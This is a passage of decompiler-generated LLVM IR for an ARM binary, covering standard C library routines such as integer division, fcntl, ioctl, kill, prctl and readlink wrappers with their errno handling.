  %v1_12c44 = phi i32 [ %v1_12c2c, %bb97 ], [ %v1_12c2c, %.thread10 ], [ %v6_12c2c, %bb98 ]
  %v0_12c30 = phi i32 [ %v6_12c28, %bb97 ], [ %v1_12c28, %.thread10 ], [ %v6_12c28, %bb98 ]
  %v2_12c30 = icmp eq i32 %v0_12c30, 0
  br i1 %v2_12c30, label %dec_label_pc_12c40, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12c34, 16
  br i1 %tmp, label %dec_label_pc_12c40, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_12c34 = udiv i32 %v1_12c34, 16
  %v4_12c38 = udiv i32 %v1_12c38, 16
  br label %dec_label_pc_12c00

dec_label_pc_12c40:                               ; preds = %thread-pre-split12, %bb99
  %v1_12c40 = icmp slt i32 %v2_12b98, 0
  br i1 %v1_12c40, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12c40
  %v2_12c44 = sub i32 0, %v1_12c44
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12c4c, %dec_label_pc_12c40, %bb100
  %v1_12c48 = phi i32 [ %v1_12c44, %dec_label_pc_12c40 ], [ %v2_12c44, %bb100 ], [ %arg1, %dec_label_pc_12c4c ], [ %v2_12c50, %bb101 ], [ %v1_12c6480, %bb103 ], [ %v2_12c60, %bb104 ]
  ret i32 %v1_12c48

dec_label_pc_12c4c:                               ; preds = %thread-pre-split
  br i1 %v1_12b94, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12c4c
  %v2_12c50 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_12c58:                               ; preds = %bb86
  br i1 %v3_12bb4, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_12c58
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_12c58, %bb102
  %v1_12c6480 = phi i32 [ %arg1, %dec_label_pc_12c58 ], [ 0, %bb102 ]
  br i1 %v9_12bb4, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_12c5c = ashr i32 %v2_12b98, 31
  %v2_12c60 = or i32 %v4_12c5c, 1
  br label %.thread16

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12bbc
  %v2_12c68 = icmp ugt i32 %v1_12c6c, 65535
  br i1 %v2_12c68, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_12c68
  %v2_12c6c = and i32 %v1_12c6c, 32768
  %v3_12c6c = icmp eq i32 %v2_12c6c, 0
  %v4_12c6c = udiv i32 %v1_12c6c, 65536
  br i1 %v3_12c6c, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_12c68
  %v0_12c7870 = phi i32 [ %v1_12c6c, %dec_label_pc_12c68 ], [ %v4_12c6c, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_12c7c = phi i32 [ %v0_12c7870, %.thread19 ], [ %v4_12c6c, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_12c78 = icmp ugt i32 %v1_12c7c, 255
  br i1 %v2_12c78, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_12c7c = and i32 %v1_12c7c, 128
  %v3_12c7c = icmp eq i32 %v2_12c7c, 0
  %v4_12c7c = udiv i32 %v1_12c7c, 256
  br i1 %v3_12c7c, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_12c80 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_12c8c = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_12c80, %bb108 ]
  %v1_12c88 = phi i32 [ %v1_12c7c, %bb106 ], [ %v4_12c7c, %bb107 ], [ %v4_12c7c, %bb108 ]
  %v2_12c84 = icmp ugt i32 %v1_12c88, 15
  br i1 %v2_12c84, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_12c88 = and i32 %v1_12c88, 8
  %v3_12c88 = icmp eq i32 %v2_12c88, 0
  %v4_12c88 = udiv i32 %v1_12c88, 16
  br i1 %v3_12c88, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_12c8c = add nsw i32 %v1_12c8c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_12c94 = phi i32 [ %v1_12c8c, %.thread20 ], [ %v1_12c8c, %bb109 ], [ %v2_12c8c, %bb110 ]
  %v5_12c98 = phi i32 [ %v1_12c88, %.thread20 ], [ %v4_12c88, %bb109 ], [ %v4_12c88, %bb110 ]
  %v2_12c90 = icmp ugt i32 %v5_12c98, 3
  %v7_12c90 = icmp eq i32 %v5_12c98, 4
  %v2_12c94 = xor i1 %v7_12c90, true
  %v3_12c94 = and i1 %v2_12c90, %v2_12c94
  br i1 %v3_12c94, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_12c94 = add nsw i32 %v4_12c94, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_12c98 = phi i32 [ %v4_12c94, %.thread21 ], [ %v5_12c94, %bb111 ]
  %v2_12c98 = xor i1 %v2_12c90, true
  %v3_12c98 = or i1 %v7_12c90, %v2_12c98
  br i1 %v3_12c98, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_12c98 = udiv i32 %v5_12c98, 2
  %v9_12c98 = add i32 %v4_12c98, %v8_12c98
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_12ca0 = phi i32 [ %v4_12c98, %bb112 ], [ %v9_12c98, %bb113 ]
  %v1_12c9c = icmp slt i32 %v2_12b98, 0
  %v6_12ca0 = lshr i32 %v0_12ca0, %v1_12ca0
  %v2_12ca4 = sub i32 0, %v6_12ca0
  %v2_12ca4.v6_12ca0 = select i1 %v1_12c9c, i32 %v2_12ca4, i32 %v6_12ca0
  ret i32 %v2_12ca4.v6_12ca0

dec_label_pc_12cac:                               ; preds = %entry
  %v0_12cb0 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12c98, { 1, 0 }
  uselistorder i1 %v7_12c90, { 1, 0 }
  uselistorder i32 %v4_12c88, { 1, 0 }
  uselistorder i32 %v1_12c88, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12c7c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12c7c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12c6c, { 1, 0 }
  uselistorder i32 %v0_12c30, { 1, 0 }
  uselistorder i32 %v4_12c24, { 1, 0 }
  uselistorder i32 %v1_12c2c, { 1, 2, 0 }
  uselistorder i32 %v4_12c18, { 1, 0 }
  uselistorder i32 %v1_12c20, { 1, 2, 0 }
  uselistorder i32 %v4_12c0c, { 1, 0 }
  uselistorder i32 %v1_12c14, { 1, 2, 0 }
  uselistorder i32 %v1_12c38, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12c08, { 1, 0 }
  uselistorder i32 %v1_12c34, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12bf4, { 1, 0 }
  uselistorder i32 %v3_12bf0, { 1, 0 }
  uselistorder i32 %v1_12bf0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12bec, { 1, 0 }
  uselistorder i32 %v1_12bf4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12be0, { 1, 0 }
  uselistorder i32 %v4_12bdc, { 2, 1, 0 }
  uselistorder i32 %v1_12be0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12be8.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_12bb4, { 1, 0 }
  uselistorder i32 %v1_12c6c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_12b98, { 1, 0, 2 }
  uselistorder i32 %v0_12b94, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 65535, { 92, 93, 0, 1, 12, 11, 2, 3, 43, 44, 23, 45, 22, 46, 14, 13, 4, 25, 47, 24, 48, 50, 15, 49, 5, 51, 52, 27, 53, 26, 54, 55, 56, 57, 28, 58, 59, 16, 60, 6, 31, 61, 62, 63, 30, 64, 29, 65, 67, 17, 66, 7, 68, 69, 35, 70, 32, 71, 33, 72, 34, 73, 18, 74, 75, 36, 76, 37, 77, 80, 81, 19, 78, 79, 8, 40, 82, 38, 83, 39, 84, 86, 20, 85, 9, 10, 87, 88, 42, 89, 41, 90, 21, 91 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12c40, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12bfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12be8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12cc4 = sdiv i32 %arg1, %arg2
  ret i32 %v2_12cc4
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_12ce0 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_12ce0
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_12cfc = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12cfc, 2
  br i1 %tmp, label %dec_label_pc_12d38, label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12d6c, label %dec_label_pc_12d28

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12d14
  %v0_12d2c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12d60

dec_label_pc_12d38:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12d54, label %dec_label_pc_12d6c

dec_label_pc_12d54:                               ; preds = %dec_label_pc_12d38
  %v0_12d58 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12d28, %dec_label_pc_12d54
  %storemerge2 = phi i32 [ %v0_12d2c, %dec_label_pc_12d28 ], [ %v0_12d58, %dec_label_pc_12d54 ]
  %storemerge.in = load i16, i16* @global_var_2447c.761, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_12d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d60 = sub i32 0, %v0_12d60
  store i32 %v1_12d60, i32* %r2.global-to-local, align 4
  %v3_12d64 = add i32 %storemerge, %storemerge2
  %v4_12d64 = inttoptr i32 %v3_12d64 to i32*
  store i32 %v1_12d60, i32* %v4_12d64, align 4
  br label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d14, %dec_label_pc_12d38, %dec_label_pc_12d60
  %storemerge1 = phi i32 [ -1, %dec_label_pc_12d60 ], [ %arg1, %dec_label_pc_12d38 ], [ %arg1, %dec_label_pc_12d14 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12d6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12d60, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12d84 = load i32, i32* @r2, align 4
  %v9_12d84 = load i32, i32* @r3, align 4
  store i32 %v9_12d84, i32* %stack_var_-4, align 4
  %v3_12d88 = load i32, i32* @r4, align 4
  store i32 %v3_12d88, i32* %stack_var_-32, align 4
  %v6_12d88 = load i32, i32* @r5, align 4
  %v12_12d88 = load i32, i32* @r7, align 4
  %v4_12d98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_12da0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12da0, i32* @r3, align 4
  %v2_12da4 = icmp eq i32 %v4_12d98, 0
  %v0_12dac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12dac, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_12d84, i32* @r4, align 4
  br i1 %v2_12da4, label %dec_label_pc_12dc8, label %dec_label_pc_12dbc

dec_label_pc_12dbc:                               ; preds = %entry
  %v7_12dbc = icmp eq i32 %arg2, 7
  br i1 %v7_12dbc, label %dec_label_pc_12e08, label %bb

bb:                                               ; preds = %dec_label_pc_12dbc
  %v8_12dc0 = icmp eq i32 %arg2, 14
  br i1 %v8_12dc0, label %dec_label_pc_12e08, label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_12dac, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_12dac, -4095
  br i1 %tmp, label %dec_label_pc_12e00, label %dec_label_pc_12de8

dec_label_pc_12de8:                               ; preds = %dec_label_pc_12dc8
  %v0_12dec = call i32 @__aeabi_read_tp()
  %v3_12df0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_12df0 = sext i16 %v3_12df0 to i32
  store i32 %v4_12df0, i32* @r3, align 4
  %v0_12df4 = load i32, i32* @r2, align 4
  %v1_12df4 = sub i32 0, %v0_12df4
  store i32 %v1_12df4, i32* @r2, align 4
  %v3_12df8 = add i32 %v4_12df0, %v0_12dec
  %v4_12df8 = inttoptr i32 %v3_12df8 to i32*
  store i32 %v1_12df4, i32* %v4_12df8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e00

dec_label_pc_12e00:                               ; preds = %dec_label_pc_12dc8, %dec_label_pc_12de8
  %v0_12e00 = phi i32 [ %v0_12dac, %dec_label_pc_12dc8 ], [ -1, %dec_label_pc_12de8 ]
  br label %dec_label_pc_12e54

dec_label_pc_12e08:                               ; preds = %dec_label_pc_12dbc, %bb
  %v0_12e08 = call i32 @__libc_enable_asynccancel()
  %v0_12e0c = load i32, i32* @r7, align 4
  store i32 %v0_12e0c, i32* @r1, align 4
  store i32 %v0_12e08, i32* %r6.global-to-local, align 4
  %v0_12e18 = load i32, i32* @r5, align 4
  store i32 %v0_12e18, i32* %r0.global-to-local, align 4
  store i32 %v0_12e18, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_12e18, -4095
  br i1 %tmp15, label %dec_label_pc_12e48, label %dec_label_pc_12e30

dec_label_pc_12e30:                               ; preds = %dec_label_pc_12e08
  %v1_12e34 = sub i32 0, %v0_12e18
  %v0_12e38 = call i32 @__aeabi_read_tp()
  store i32 %v0_12e38, i32* %r0.global-to-local, align 4
  %v3_12e3c = load i16, i16* @global_var_2447c.761, align 2
  %v4_12e3c = sext i16 %v3_12e3c to i32
  store i32 %v4_12e3c, i32* @r3, align 4
  %v3_12e40 = add i32 %v4_12e3c, %v0_12e38
  %v4_12e40 = inttoptr i32 %v3_12e40 to i32*
  store i32 %v1_12e34, i32* %v4_12e40, align 4
  store i32 -1, i32* @r2, align 4
  %v0_12e48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12e48

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12e08, %dec_label_pc_12e30
  %v0_12e4c = phi i32 [ %v0_12e18, %dec_label_pc_12e08 ], [ -1, %dec_label_pc_12e30 ]
  %v0_12e48 = phi i32 [ %v0_12e08, %dec_label_pc_12e08 ], [ %v0_12e48.pre, %dec_label_pc_12e30 ]
  store i32 %v0_12e48, i32* %r0.global-to-local, align 4
  store i32 %v0_12e4c, i32* @r7, align 4
  %v1_12e50 = call i32 @__libc_disable_asynccancel(i32 %v0_12e48)
  store i32 %v1_12e50, i32* %r0.global-to-local, align 4
  %v0_12e54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12e54

dec_label_pc_12e54:                               ; preds = %dec_label_pc_12e00, %dec_label_pc_12e48
  %v0_12e54 = phi i32 [ %v0_12e00, %dec_label_pc_12e00 ], [ %v0_12e54.pre, %dec_label_pc_12e48 ]
  store i32 %v0_12e54, i32* %r0.global-to-local, align 4
  %v2_12e5c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12e5c, i32* @r4, align 4
  store i32 %v6_12d88, i32* @r5, align 4
  store i32 %v12_12d88, i32* @r7, align 4
  ret i32 %v0_12e54

; uselistorder directives
  uselistorder i32 %v0_12e54, { 1, 0 }
  uselistorder i32 %v0_12e48, { 1, 0 }
  uselistorder i32 %v0_12e18, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12dac, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12e54, { 1, 0 }
  uselistorder label %dec_label_pc_12e48, { 1, 0 }
  uselistorder label %dec_label_pc_12e08, { 1, 0 }
  uselistorder label %dec_label_pc_12e00, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_12e88 = load i32, i32* @r0, align 4
  ret i32 %v1_12e88
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_12e8c = load i32, i32* @r3, align 4
  store i32 %v9_12e8c, i32* %stack_var_-4, align 4
  %v3_12e90 = load i32, i32* @r4, align 4
  store i32 %v3_12e90, i32* %stack_var_-32, align 4
  %v6_12e90 = load i32, i32* @r5, align 4
  %v12_12e90 = load i32, i32* @r7, align 4
  %v4_12ea0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_12ea8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12ea8, i32* @r3, align 4
  %v2_12eac = icmp eq i32 %v4_12ea0, 0
  %v0_12eb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12eb4, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_12eac, label %dec_label_pc_12ec4, label %dec_label_pc_12efc

dec_label_pc_12ec4:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_12eb4, -4095
  br i1 %tmp, label %dec_label_pc_12ef4, label %dec_label_pc_12edc

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12ec4
  %v1_12ee0 = sub i32 0, %v0_12eb4
  %v3_12ee4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_12ee4 = sext i16 %v3_12ee4 to i32
  store i32 %v4_12ee4, i32* @r3, align 4
  %v0_12ee8 = call i32 @__aeabi_read_tp()
  %v2_12eec = load i32, i32* @r3, align 4
  %v3_12eec = add i32 %v2_12eec, %v0_12ee8
  %v4_12eec = inttoptr i32 %v3_12eec to i32*
  store i32 %v1_12ee0, i32* %v4_12eec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ef4

dec_label_pc_12ef4:                               ; preds = %dec_label_pc_12ec4, %dec_label_pc_12edc
  %v0_12ef4 = phi i32 [ %v0_12eb4, %dec_label_pc_12ec4 ], [ -1, %dec_label_pc_12edc ]
  br label %dec_label_pc_12f48

dec_label_pc_12efc:                               ; preds = %entry
  %v0_12efc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12efc, i32* %r6.global-to-local, align 4
  %v0_12f0c = load i32, i32* @r4, align 4
  store i32 %v0_12f0c, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_12f0c, -4095
  br i1 %tmp15, label %dec_label_pc_12f3c, label %dec_label_pc_12f24

dec_label_pc_12f24:                               ; preds = %dec_label_pc_12efc
  %v1_12f28 = sub i32 0, %v0_12f0c
  %v3_12f2c = load i16, i16* @global_var_2447c.761, align 2
  %v4_12f2c = sext i16 %v3_12f2c to i32
  store i32 %v4_12f2c, i32* @r3, align 4
  %v0_12f30 = call i32 @__aeabi_read_tp()
  store i32 %v0_12f30, i32* %r0.global-to-local, align 4
  %v2_12f34 = load i32, i32* @r3, align 4
  %v3_12f34 = add i32 %v2_12f34, %v0_12f30
  %v4_12f34 = inttoptr i32 %v3_12f34 to i32*
  store i32 %v1_12f28, i32* %v4_12f34, align 4
  %v0_12f3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12f3c

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12efc, %dec_label_pc_12f24
  %v0_12f40 = phi i32 [ %v0_12f0c, %dec_label_pc_12efc ], [ -1, %dec_label_pc_12f24 ]
  %v0_12f3c = phi i32 [ %v0_12efc, %dec_label_pc_12efc ], [ %v0_12f3c.pre, %dec_label_pc_12f24 ]
  store i32 %v0_12f3c, i32* %r0.global-to-local, align 4
  store i32 %v0_12f40, i32* @r7, align 4
  %v1_12f44 = call i32 @__libc_disable_asynccancel(i32 %v0_12f3c)
  store i32 %v1_12f44, i32* %r0.global-to-local, align 4
  %v0_12f48.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12f48

dec_label_pc_12f48:                               ; preds = %dec_label_pc_12ef4, %dec_label_pc_12f3c
  %v0_12f48 = phi i32 [ %v0_12ef4, %dec_label_pc_12ef4 ], [ %v0_12f48.pre, %dec_label_pc_12f3c ]
  store i32 %v0_12f48, i32* %r0.global-to-local, align 4
  %v2_12f50 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12f50, i32* @r4, align 4
  store i32 %v6_12e90, i32* @r5, align 4
  store i32 %v12_12e90, i32* @r7, align 4
  ret i32 %v0_12f48

; uselistorder directives
  uselistorder i32 %v0_12f48, { 1, 0 }
  uselistorder i32 %v0_12f3c, { 1, 0 }
  uselistorder i32 %v0_12f0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12eb4, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12f48, { 1, 0 }
  uselistorder label %dec_label_pc_12f3c, { 1, 0 }
  uselistorder label %dec_label_pc_12ef4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f6c = load i32, i32* @r7, align 4
  store i32 %v3_12f6c, i32* %stack_var_-8, align 4
  %v0_12f78 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f78, -4095
  br i1 %tmp, label %dec_label_pc_12f98, label %dec_label_pc_12f80

dec_label_pc_12f80:                               ; preds = %entry
  %v1_12f84 = sub i32 0, %v0_12f78
  %v3_12f88 = load i16, i16* @global_var_2447c.761, align 2
  %v4_12f88 = sext i16 %v3_12f88 to i32
  %v0_12f8c = call i32 @__aeabi_read_tp()
  %v3_12f90 = add i32 %v4_12f88, %v0_12f8c
  %v4_12f90 = inttoptr i32 %v3_12f90 to i32*
  store i32 %v1_12f84, i32* %v4_12f90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f98

dec_label_pc_12f98:                               ; preds = %entry, %dec_label_pc_12f80
  %v1_12f9c = phi i32 [ %v0_12f78, %entry ], [ -1, %dec_label_pc_12f80 ]
  %v2_12f98 = phi i32 [ %v3_12f6c, %entry ], [ %v2_12f98.pre, %dec_label_pc_12f80 ]
  store i32 %v2_12f98, i32* @r7, align 4
  ret i32 %v1_12f9c

; uselistorder directives
  uselistorder i32 %v0_12f78, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f98, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12fa4 = load i32, i32* @r4, align 4
  store i32 %v3_12fa4, i32* %stack_var_-12, align 4
  %v0_12fb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fb4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fb4, -4095
  br i1 %tmp, label %dec_label_pc_12fdc, label %dec_label_pc_12fc4

dec_label_pc_12fc4:                               ; preds = %entry
  %v0_12fc8 = call i32 @__aeabi_read_tp()
  %v3_12fcc = load i16, i16* @global_var_2447c.761, align 2
  %v4_12fcc = sext i16 %v3_12fcc to i32
  %v0_12fd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12fd0 = sub i32 0, %v0_12fd0
  store i32 %v1_12fd0, i32* %r2.global-to-local, align 4
  %v3_12fd4 = add i32 %v4_12fcc, %v0_12fc8
  %v4_12fd4 = inttoptr i32 %v3_12fd4 to i32*
  store i32 %v1_12fd0, i32* %v4_12fd4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12fdc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12fdc:                               ; preds = %entry, %dec_label_pc_12fc4
  %v1_12fe0 = phi i32 [ %v0_12fb4, %entry ], [ -1, %dec_label_pc_12fc4 ]
  %v2_12fdc = phi i32 [ %v3_12fa4, %entry ], [ %v2_12fdc.pre, %dec_label_pc_12fc4 ]
  store i32 %v2_12fdc, i32* @r4, align 4
  ret i32 %v1_12fe0

; uselistorder directives
  uselistorder i32 %v0_12fb4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12fdc, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fe8 = load i32, i32* @r7, align 4
  store i32 %v3_12fe8, i32* %stack_var_-8, align 4
  %v0_12ff4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12ff4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ff4, -4095
  br i1 %tmp, label %dec_label_pc_1301c, label %dec_label_pc_13004

dec_label_pc_13004:                               ; preds = %entry
  %v0_13008 = call i32 @__aeabi_read_tp()
  %v3_1300c = load i16, i16* @global_var_2447c.761, align 2
  %v4_1300c = sext i16 %v3_1300c to i32
  %v0_13010 = load i32, i32* %r2.global-to-local, align 4
  %v1_13010 = sub i32 0, %v0_13010
  store i32 %v1_13010, i32* %r2.global-to-local, align 4
  %v3_13014 = add i32 %v4_1300c, %v0_13008
  %v4_13014 = inttoptr i32 %v3_13014 to i32*
  store i32 %v1_13010, i32* %v4_13014, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1301c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1301c

dec_label_pc_1301c:                               ; preds = %entry, %dec_label_pc_13004
  %v1_13020 = phi i32 [ %v0_12ff4, %entry ], [ -1, %dec_label_pc_13004 ]
  %v2_1301c = phi i32 [ %v3_12fe8, %entry ], [ %v2_1301c.pre, %dec_label_pc_13004 ]
  store i32 %v2_1301c, i32* @r7, align 4
  ret i32 %v1_13020

; uselistorder directives
  uselistorder i32 %v0_12ff4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1301c, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13028 = load i32, i32* @r4, align 4
  store i32 %v3_13028, i32* %stack_var_-12, align 4
  %v0_13038 = load i32, i32* @r0, align 4
  store i32 %v0_13038, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13038, -4095
  br i1 %tmp, label %dec_label_pc_13060, label %dec_label_pc_13048

dec_label_pc_13048:                               ; preds = %entry
